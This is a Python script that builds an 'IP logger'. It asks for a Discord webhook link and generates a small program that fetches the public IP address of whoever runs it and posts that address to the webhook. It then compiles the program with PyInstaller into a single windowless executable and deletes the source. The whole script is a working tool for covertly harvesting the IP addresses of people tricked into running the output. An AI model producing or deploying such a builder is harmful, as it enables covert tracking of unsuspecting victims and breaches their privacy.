import os
import time

print("Welcome to ip logger builder!")
time.sleep(2)
os.system("pip install discord_webhook")
os.system("pip install requests")
os.system("cls")
webhook_link = input('Enter your discord webhook link:\n')
time.sleep(2)
print("URL checked, started building...")
time.sleep(2)
os.system("cls")
with open("main.py", "a") as logger:
    logger.write("from discord_webhook import DiscordWebhook\nimport requests\n\nr = requests.get(url='http://httpbin.org/ip').json()\nip = r['origin']\n\nwebhook = DiscordWebhook(url='" + webhook_link + "', content=((ip) + ' logged by https://github.com/r3s1l13nt/discord-ip-logger/'))\nwebhook.execute()\n")
os.system("pip install pyinstaller")
os.system("pyinstaller --onefile --icon=NONE --noconsole main.py")
time.sleep(2)
os.remove("main.py")
os.system("cls")
time.sleep(2)
print("Successfully builded!\nYour build is located in dist folder.")
